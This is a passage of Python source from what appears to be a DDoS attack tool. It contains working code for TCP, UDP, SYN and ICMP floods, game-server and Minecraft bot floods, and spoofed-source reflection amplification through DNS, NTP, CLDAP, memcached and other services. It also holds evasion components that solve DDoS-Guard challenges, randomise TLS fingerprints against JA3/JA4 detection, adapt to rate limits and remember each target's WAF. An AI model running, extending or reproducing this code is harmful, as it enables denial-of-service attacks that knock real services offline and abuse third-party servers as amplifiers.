        self.phase_start_time = time.time()
        self.baseline_rps = 0.0
        self.evaluation_count = 0

        # Connection health
        self.conn_fail_count = 0
        self.conn_fail_rate = 0.0

    def get_active_methods(self) -> list:
        with self.lock:
            return list(self.active_methods)

    def get_phase(self):
        return AttackPhase.DIRECT_FLOOD  # legacy compat: always show dominant strategy

    def get_status(self) -> dict:
        with self.lock:
            dominant = max(self.strategy_weights, key=self.strategy_weights.get)
            return {
                "phase": dominant.name,
                "weights": dict(self.strategy_weights),
                "waf": self.detected_waf,
                "ewma_error": self.ewma.ewma_error,
                "severity": self.ewma.severity(),
                "methods": len(self.active_methods),
                "conn_health": 1.0 - self.conn_fail_rate,
            }

    def stop(self):
        with self.lock:
            self._stop = True

    def _prewarm(self):
        """Seed portfolio from target memory (historical intel)."""
        if self._prewarmed or not self.target_url:
            return
        self._prewarmed = True
        TargetMemory.prewarm_portfolio(self.target_url, self.portfolio)

        # If target known Cloudflare/DDoS-Guard → bias toward BYPASS
        waf = self._target_intel.get("waf", "")
        if waf:
            self.log(f"[Adaptive] 🧠 Memory recall: {waf} detected previously — boosting BYPASS weight")
            with self.lock:
                new_weights = dict(self.strategy_weights)
                if "cloudflare" in waf.lower() or "ddos" in waf.lower():
                    new_weights[AttackPhase.BYPASS_MODE] = min(0.55, new_weights.get(AttackPhase.BYPASS_MODE, 0.25) * 2.0)
                    new_weights[AttackPhase.STEALTH_MODE] = min(0.30, new_weights.get(AttackPhase.STEALTH_MODE, 0.18) * 1.5)
                    # Normalize
                    total = sum(new_weights.values())
                    self.strategy_weights = {k: v / total for k, v in new_weights.items()}
                    self.active_methods = self._methods_from_weights(self.strategy_weights)

    def _methods_from_weights(self, weights: dict) -> list:
        """Build flat method list from strategy weights: each strategy's methods
           appear proportionally to weight."""
        result = []
        for phase, weight in weights.items():
            if weight <= 0.01:
                continue
            methods = PHASE_METHODS.get(phase, [])
            if phase == AttackPhase.MIXED_CHAOS:
                methods = _random_mod.sample(
                    self.all_methods,
                    min(8, len(self.all_methods)),
                )
            methods = [m for m in methods if m in self.all_methods]
            if not methods:
                methods = self.all_methods[:3]
            # Duplicate methods proportional to weight (for thread distribution)
            copies = max(1, int(weight * len(methods) * 2))
            for _ in range(copies):
                # Shuffle order to interleave strategies
                _random_mod.shuffle(methods)
                result.extend(methods)
        # Deduplicate but keep some repetition for thread weight
        seen, deduped = set(), []
        for m in result:
            if m not in seen:
                seen.add(m)
                deduped.append(m)
        return deduped if len(deduped) >= 4 else (deduped + self.all_methods[:4])[:len(self.all_methods)]

    def _update_strategy_weights(self, per_strategy_stats: dict):
        """Update strategy weights based on per-strategy success rates.
           per_strategy_stats: {phase_enum: (success_ct, fail_ct)}"""
        with self.lock:
            scores = {}
            for phase in ALL_PHASES:
                s, f = per_strategy_stats.get(phase, (0, 0))
                total = s + f
                if total > 0:
                    # Bayesian posterior mean: (α+s) / (α+β+s+f)
                    score = (1 + s) / (2 + total)
                else:
                    score = self.strategy_weights.get(phase, 0.1)
                scores[phase] = score

            # Hard floor: no strategy below 5%
            min_weight = 0.05
            for phase in ALL_PHASES:
                scores[phase] = max(min_weight, scores[phase])

            # Normalize
            total = sum(scores.values())
            self.strategy_weights = {k: v / total for k, v in scores.items()}

            # Update active methods
            self.active_methods = self._methods_from_weights(self.strategy_weights)

    def evaluate_and_rotate(self, current_rps: float, status_snapshot: dict,
                            per_method_stats: dict = None,
                            content_samples: list = None,
                            content_state_flags: list = None):
        """Full IQ-900 evaluation cycle. Called every check_interval seconds.

           status_snapshot: {"2xx":X, "4xx":Y, "5xx":Z, "timeout":T}
           per_method_stats: {method_name: (2xx_ct, 4xx_ct, 5xx_ct, timeout_ct)}
           content_samples: list of (status_code, body_bytes) tuples from recent requests
           content_state_flags: list of "challenge"/"blocked"/"clean" from ResponseFingerprinter.quick_check()
        """
        with self.lock:
            if self._stop:
                return

            self._prewarm()
            self.evaluation_count += 1

            total = sum(status_snapshot.values()) or 1
            error_rate = (status_snapshot.get("4xx", 0) +
                         status_snapshot.get("5xx", 0) +
                         status_snapshot.get("timeout", 0)) / total
            success_rate = status_snapshot.get("2xx", 0) / total
            ewma_err = self.ewma.update(error_rate)

            # --- Content fingerprinting ---
            content_verdict = "unknown"
            waf_hit = None
            if content_samples:
                challenge_ct = sum(1 for c in (content_state_flags or []) if c == "challenge")
                blocked_ct = sum(1 for c in (content_state_flags or []) if c == "blocked")
                if challenge_ct > 0:
                    content_verdict = "challenge"
                elif blocked_ct > 0:
                    content_verdict = "blocked"
                    # Deep analyze one sample
                    for sc, body in content_samples[:3]:
                        fp = ResponseFingerprinter.analyze(body, sc)
                        if fp["waf"]:
                            waf_hit = fp["waf"]
                            self.detected_waf = fp["waf"]
                            break
                else:
                    content_verdict = "clean"
            self.last_content_state = content_verdict

            # --- Per-method stats update ---
            if per_method_stats:
                for method, (s2, s4, s5, st) in per_method_stats.items():
                    success = s2
                    fail = s4 + s5 + st
                    if success + fail > 0:
                        self.portfolio.record(method, success, fail)

            # --- Per-strategy stats (for weight update) ---
            per_strategy = {}
            for phase in ALL_PHASES:
                phase_methods = PHASE_METHODS.get(phase, [])
                if phase == AttackPhase.MIXED_CHAOS:
                    phase_methods = self.all_methods
                s_total, f_total = 0, 0
                for m in phase_methods:
                    if per_method_stats and m in per_method_stats:
                        s2, s4, s5, st = per_method_stats[m]
                        s_total += s2
                        f_total += s4 + s5 + st
                per_strategy[phase] = (s_total, f_total)

            # --- Weight update ---
            self._update_strategy_weights(per_strategy)

            # --- Baseline update ---
            if self.baseline_rps < current_rps:
                self.baseline_rps = current_rps

            # --- Log ---
            dominant = max(self.strategy_weights, key=self.strategy_weights.get)
            status_str = ", ".join(f"{k}:{v}" for k, v in sorted(status_snapshot.items()))
            elapsed = time.time() - self.phase_start_time
            w_str = ", ".join(f"{p.name}={w:.0%}" for p, w in
                             sorted(self.strategy_weights.items(), key=lambda x: x[1], reverse=True)[:4])

            self.log(
                f"[Adaptive IQ-900] Dominant={dominant.name} | EWMA_Err={ewma_err:.0%} "
                f"({self.ewma.severity()}) | WAF={self.detected_waf} | Content={content_verdict} | "
                f"RPS={current_rps:.0f} | {status_str} | Elapsed={elapsed:.0f}s "
                f"| Weights=[{w_str}]"
            )
            self.log(self.portfolio.get_stats())

            # --- Persistent memory save ---
            if self.evaluation_count % 5 == 0 and self.target_url:
                best_methods = sorted(self.portfolio.alpha.items(),
                                     key=lambda x: x[1] / max(x[1] + self.portfolio.beta[x[0]], 1),
                                     reverse=True)[:5]
                best_names = [m for m, _ in best_methods]
                TargetMemory.record_attack(
                    self.target_url,
                    self.detected_waf,
                    self.all_methods,
                    success_rate,
                    best_names,
                )


class Tools:
    IP = compile("(?:\\d{1,3}\\.){3}\\d{1,3}")
    protocolRex = compile('"protocol":(\\d+)')

    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        MULTIPLES = [
            "B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"
        ]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        else:
            return "-- B"

    @staticmethod
    def humanformat(num: int, precision: int = 2):
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum(
                [abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        else:
            return num

    @staticmethod
    def sizeOfRequest(res: Response) -> int:
        size: int = len(res.request.method)
        size += len(res.request.url)
        size += len('\r\n'.join(f'{key}: {value}'
                                for key, value in res.request.headers.items()))
        return size

    @staticmethod
    def send(sock: socket, packet: bytes, method: str = None):
        """Send packet over socket. If `method` is None, falls back to the
           per-thread method tag set by HttpFlood.run() so the Bayesian portfolio
           sees telemetry from ALL 25 methods (not just the 4 cloudscraper-based
           ones), without touching 50 call sites.

           Provides per-method adaptive telemetry: socket.send True → s2xx
           bucket, False/exception → stimeout bucket. Coarser than HTTP status,
           but the difference between blind and informed."""
        global BYTES_SEND, REQUESTS_SENT
        # Auto-fill method from thread-local if not explicitly given
        if method is None:
            method = _get_thread_method()
        try:
            if not sock.send(packet):
                if AUTO_RPC_ENABLED: _adaptive_rpc.report_fail()
                if method: _adaptive_record_send_result(method, False)
                return False
        except Exception:
            if AUTO_RPC_ENABLED: _adaptive_rpc.report_fail()
            if method: _adaptive_record_send_result(method, False)
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        if AUTO_RPC_ENABLED: _adaptive_rpc.report_success()
        if method: _adaptive_record_send_result(method, True)
        return True



    @staticmethod
    def sendto(sock, packet, target):
        global BYTES_SEND, REQUESTS_SENT
        try:
            if not sock.sendto(packet, target):
                if AUTO_RPC_ENABLED: _adaptive_rpc.report_fail()
                return False
        except Exception:
            if AUTO_RPC_ENABLED: _adaptive_rpc.report_fail()
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        if AUTO_RPC_ENABLED: _adaptive_rpc.report_success()
        return True

    @staticmethod
    def dgb_solver(url, ua, pro=None):
        s = None
        idss = None
        s = Session()
        if pro:
            s.proxies = pro
        try:
            hdrs = {
                "User-Agent": ua,
                "Accept": "text/html",
                "Accept-Language": "en-US",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "TE": "trailers",
                "DNT": "1"
            }
            ss = s.get(url, headers=hdrs)
            for key, value in ss.cookies.items():
                s.cookies.set_cookie(cookies.create_cookie(key, value))
            hdrs = {
                "User-Agent": ua,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            ss = s.post("https://check.ddos-guard.net/check.js", headers=hdrs)
            for key, value in ss.cookies.items():
                if key == '__ddg2':
                    idss = value
                s.cookies.set_cookie(cookies.create_cookie(key, value))

            hdrs = {
                "User-Agent": ua,
                "Accept": "image/webp,*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "no-cache",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            ss = s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs)
            for key, value in ss.cookies.items():
                s.cookies.set_cookie(cookies.create_cookie(key, value))
        except Exception:
            pass
        return s

    @staticmethod
    def safe_close(sock=None):
        if sock:
            sock.close()


class Minecraft:
    @staticmethod
    def varint(d: int) -> bytes:
        o = b''
        while True:
            b = d & 0x7F
            d >>= 7
            o += data_pack("B", b | (0x80 if d > 0 else 0))
            if d == 0:
                break
        return o

    @staticmethod
    def data(*payload: bytes) -> bytes:
        payload = b''.join(payload)
        return Minecraft.varint(len(payload)) + payload

    @staticmethod
    def short(integer: int) -> bytes:
        return data_pack('>H', integer)

    @staticmethod
    def long(integer: int) -> bytes:
        return data_pack('>q', integer)

    @staticmethod
    def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(version),
                              Minecraft.data(target[0].encode()),
                              Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def handshake_forwarded(target: Tuple[str, int], version: int, state: int, ip: str, uuid: UUID) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(version),
                              Minecraft.data(
                                  target[0].encode(),
                                  b"\x00",
                                  ip.encode(),
                                  b"\x00",
                                  uuid.hex.encode()
                              ),
                              Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def login(protocol: int, username: str) -> bytes:
        if isinstance(username, str):
            username = username.encode()
        return Minecraft.data(Minecraft.varint(0x00 if protocol >= 391 else \
                                               0x01 if protocol >= 385 else \
                                               0x00),
                              Minecraft.data(username))

    @staticmethod
    def keepalive(protocol: int, num_id: int) -> bytes:
        return Minecraft.data(Minecraft.varint(0x0F if protocol >= 755 else \
                                               0x10 if protocol >= 712 else \
                                               0x0F if protocol >= 471 else \
                                               0x10 if protocol >= 464 else \
                                               0x0E if protocol >= 389 else \
                                               0x0C if protocol >= 386 else \
                                               0x0B if protocol >= 345 else \
                                               0x0A if protocol >= 343 else \
                                               0x0B if protocol >= 336 else \
                                               0x0C if protocol >= 318 else \
                                               0x0B if protocol >= 107 else \
                                               0x00),
                              Minecraft.long(num_id) if protocol >= 339 else \
                              Minecraft.varint(num_id))

    @staticmethod
    def chat(protocol: int, message: str) -> bytes:
        return Minecraft.data(Minecraft.varint(0x03 if protocol >= 755 else \
                                               0x03 if protocol >= 464 else \
                                               0x02 if protocol >= 389 else \
                                               0x01 if protocol >= 343 else \
                                               0x02 if protocol >= 336 else \
                                               0x03 if protocol >= 318 else \
                                               0x02 if protocol >= 107 else \
                                               0x01),
                              Minecraft.data(message.encode()))


# noinspection PyBroadException,PyUnusedLocal
class Layer4(Thread):
    _method: str
    _target: Tuple[str, int]
    _ref: Any
    SENT_FLOOD: Any
    _amp_payloads = cycle
    _proxies: List[Proxy] = None

    def __init__(self,
                 target: Tuple[str, int],
                 ref: List[str] = None,
                 method: str = "TCP",
                 synevent: Event = None,
                 proxies: Set[Proxy] = None,
                 protocolid: int = 74):
        Thread.__init__(self, daemon=True)
        self._amp_payload = None
        self._amp_payloads = cycle([])
        self._ref = ref
        self.protocolid = protocolid
        self._method = method
        self._target = target
        self._synevent = synevent
        if proxies:
            self._proxies = list(proxies)

        self.methods = {
            "UDP": self.UDP,
            "SYN": self.SYN,
            "VSE": self.VSE,
            "TS3": self.TS3,
            "MCPE": self.MCPE,
            "FIVEM": self.FIVEM,
            "MINECRAFT": self.MINECRAFT,
            "CPS": self.CPS,
            "CONNECTION": self.CONNECTION,
            "MCBOT": self.MCBOT,
        }

    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            if AUTO_RPC_ENABLED:
                self._rpc = _adaptive_rpc.get()
            self.SENT_FLOOD()

    def open_connection(self,
                        conn_type=AF_INET,
                        sock_type=SOCK_STREAM,
                        proto_type=IPPROTO_TCP):
        if self._proxies:
            s = randchoice(self._proxies).open_socket(
                conn_type, sock_type, proto_type)
        else:
            s = socket(conn_type, sock_type, proto_type)
        s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        s.settimeout(.9)
        s.connect(self._target)
        return s

    def TCP(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, randbytes(1024)):
                continue
        Tools.safe_close(s)

    def MINECRAFT(self) -> None:
        handshake = Minecraft.handshake(self._target, self.protocolid, 1)
        ping = Minecraft.data(b'\x00')

        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, handshake):
                Tools.send(s, ping)
        Tools.safe_close(s)

    def CPS(self) -> None:
        global REQUESTS_SENT
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            REQUESTS_SENT += 1
        Tools.safe_close(s)

    def alive_connection(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while s.recv(1):
                continue
        Tools.safe_close(s)

    def CONNECTION(self) -> None:
        global REQUESTS_SENT
        with suppress(Exception):
            Thread(target=self.alive_connection).start()
            REQUESTS_SENT += 1

    def UDP(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, randbytes(1024), self._target):
                continue
        Tools.safe_close(s)

    def ICMP(self) -> None:
        payload = self._genrate_icmp()
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def SYN(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, self._genrate_syn(), self._target):
                continue
        Tools.safe_close(s)

    def AMP(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW,
                                         IPPROTO_UDP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, *next(self._amp_payloads)):
                continue
        Tools.safe_close(s)

    def MCBOT(self) -> None:
        s = None

        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            Tools.send(s, Minecraft.handshake_forwarded(self._target,
                                                        self.protocolid,
                                                        2,
                                                        ProxyTools.Random.rand_ipv4(),
                                                        uuid4()))
            username = f"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}"
            password = b64encode(username.encode()).decode()[:8].title()
            Tools.send(s, Minecraft.login(self.protocolid, username))
            
            sleep(1.5)

            Tools.send(s, Minecraft.chat(self.protocolid, "/register %s %s" % (password, password)))
            Tools.send(s, Minecraft.chat(self.protocolid, "/login %s" % password))

            while Tools.send(s, Minecraft.chat(self.protocolid, str(ProxyTools.Random.rand_str(256)))):
                sleep(1.1)

        Tools.safe_close(s)

    def VSE(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                   b'\x20\x51\x75\x65\x72\x79\x00')
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def FIVEM(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def TS3(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def MCPE(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = (b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
                   b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
                   b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
                   b'\x73')
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def _genrate_syn(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        tcp: TCP = TCP()
        tcp.set_SYN()
        tcp.set_th_flags(0x02)
        tcp.set_th_dport(self._target[1])
        tcp.set_th_sport(ProxyTools.Random.rand_int(32768, 65535))
        ip.contains(tcp)
        return ip.get_packet()

    def _genrate_icmp(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        icmp: ICMP = ICMP()
        icmp.set_icmp_type(icmp.ICMP_ECHO)
        icmp.contains(Data(b"A" * ProxyTools.Random.rand_int(16, 1024)))
        ip.contains(icmp)
        return ip.get_packet()

    def _generate_amp(self):
        payloads = []
        for ref in self._ref:
            ip: IP = IP()
            ip.set_ip_src(self._target[0])
            ip.set_ip_dst(ref)

            ud: UDP = UDP()
            ud.set_uh_dport(self._amp_payload[1])
            ud.set_uh_sport(self._target[1])

            ud.contains(Data(self._amp_payload[0]))
            ip.contains(ud)

            payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
        return payloads

    def select(self, name):
        self.SENT_FLOOD = self.TCP
        for key, value in self.methods.items():
            if name == key:
                self.SENT_FLOOD = value
            elif name == "ICMP":
                self.SENT_FLOOD = self.ICMP
                self._target = (self._target[0], 0)
            elif name == "RDP":
                self._amp_payload = (
                    b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',
                    3389)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "CLDAP":
                self._amp_payload = (
                    b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
                    b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
                    389)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "MEM":
                self._amp_payload = (
                    b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "CHAR":
                self._amp_payload = (b'\x01', 19)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "ARD":
                self._amp_payload = (b'\x00\x14\x00\x00', 3283)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "NTP":
                self._amp_payload = (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "DNS":
                self._amp_payload = (
                    b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
                    b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00',
                    53)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())


# --- 2026 Upgrade Modules ---

# Modern browser templates (Chrome 120+, Firefox 120+, Edge 120+)
MODERN_BROWSER_TEMPLATES = {
    "chrome_120_windows": {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
    },
    "firefox_120_windows": {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
    },
    "edge_120_windows": {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
    },
}

# Acceptable cipher lists for randomization (modern TLS 1.2/1.3 ciphers, shuffled per connection)
_TLS_CIPHER_POOLS = None  # lazy-init per OS

def _build_cipher_pools():
    """Return cipher pools safe for current OS OpenSSL/LibreSSL."""
    import ssl as _ssl
    pools = []
    # Tier 1: modern ECDHE + AES-GCM (works everywhere)
    pools.append("ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384")
    # Tier 2: + CHACHA20 (OpenSSL only, LibreSSL chokes)
    try:
        test = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
        test.set_ciphers("ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-CHACHA20-POLY1305")
        pools.append("ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384")
        pools.append("ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256")
    except Exception:
        pass
    # Tier 3: wide compat
    pools.append("ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-GCM-SHA384")
    return pools


class TLSRandomizer:
    """Randomize TLS fingerprint per connection to evade JA3/JA4 detection.
       Forces TLS 1.3 minimum, shuffles extensions, randomizes ALPN, disables session tickets."""
    _pool = None
    _pool_lock = threading.Lock()
    _tls_counter = 0
    _cached_ctx = None

    @classmethod
    def _get_pool(cls):
        if cls._pool is None:
            with cls._pool_lock:
                if cls._pool is None:
                    cls._pool = cycle(_build_cipher_pools())
        return cls._pool

    @staticmethod
    def get_ssl_context() -> SSLContext:
        """Get cached SSL context (reused across connections for performance)."""
        if TLSRandomizer._cached_ctx is not None:
            return TLSRandomizer._cached_ctx
        
        ctx = _create_unverified_context()
        ctx.check_hostname = False
        ctx.verify_mode = CERT_NONE
        # Force minimum TLS 1.2, prefer 1.3
        ctx.options |= OP_NO_COMPRESSION
        try:
            ctx.minimum_version = TLSVersion.TLSv1_2
        except Exception:
            with suppress(Exception):
                ctx.options |= getattr(ctx, 'OP_NO_TLSv1', 0) | getattr(ctx, 'OP_NO_TLSv1_1', 0)
        # Disable session tickets — prevents ID reuse across connections
        try:
            ctx.options |= getattr(ctx, 'OP_NO_TICKET', 0)
        except Exception:
            pass
        # Disable session caching
        try:
            ctx.session_stats_mode = getattr(ctx, 'SESSION_STATS_MODE_DISABLED', 0)
        except Exception:
            pass
        # Set cipher (cipher randomization done per-connection in open_connection)
        try:
            ctx.set_ciphers('DEFAULT:@SECLEVEL=0')
        except Exception:
            with suppress(Exception):
                ctx.set_ciphers('ALL:COMPLEMENTOFALL')
        # Disable post-handshake auth to avoid extra fingerprint signal
        try:
            ctx.post_handshake_auth = False
        except Exception:
            pass
        
        TLSRandomizer._cached_ctx = ctx
        return ctx


class AdaptiveThrottle:
    """Detect rate-limiting and auto-adjust RPC to evade blocklists."""
    def __init__(self, initial_rpc: int = 10):
        self.rpc = initial_rpc
        self.min_rpc = 1
        self.max_rpc = initial_rpc
        self.block_count = 0
        self.success_count = 0
        self.last_adjust_time = time.time()
        self._cooldown_until = 0

    def report(self, status_code: int) -> None:
        if status_code in {429, 503, 403}:
            self.block_count += 1
            self.success_count = 0
        elif status_code == 200:
            self.success_count += 1
            self.block_count = 0
        self._maybe_adjust()

    def _maybe_adjust(self) -> None:
        now = time.time()
        if now < self._cooldown_until:
            return
        if self.block_count >= 3:
            self.rpc = max(self.min_rpc, self.rpc // 2)
            self.block_count = 0
            self._cooldown_until = now + 2.0
        elif self.success_count >= 10:
            self.rpc = min(self.max_rpc, int(self.rpc * 1.5))
            self.success_count = 0
            self._cooldown_until = now + 1.0


# === DNS Cache — avoid repeated DNS lookups ===
_DNS_CACHE = {}
_DNS_CACHE_LOCK = threading.Lock()
_DNS_CACHE_TTL = 300  # 5 minutes

def cached_gethostbyname(hostname: str) -> str:
    """DNS resolve with TTL cache. Avoids 1 syscall per connection."""
    now = time.time()
    with _DNS_CACHE_LOCK:
        entry = _DNS_CACHE.get(hostname)
        if entry and now - entry[1] < _DNS_CACHE_TTL:
            return entry[0]
    # Resolve outside lock
    try:
        ip = gethostbyname(hostname)
        with _DNS_CACHE_LOCK:
            _DNS_CACHE[hostname] = (ip, now)
        return ip
    except Exception:
        return hostname  # fallback


class WAFDetector:
    """Detect WAF/CDN from response headers."""
    @staticmethod
    def analyze(headers: dict) -> str:
        h = {k.lower(): v for k, v in headers.items()}
        if "cf-ray" in h:
            return "Cloudflare"
        if "x-sucuri-id" in h:
            return "Sucuri"
        if "x-akamai-transformed" in h or "x-akamai-request-id" in h:
            return "Akamai"
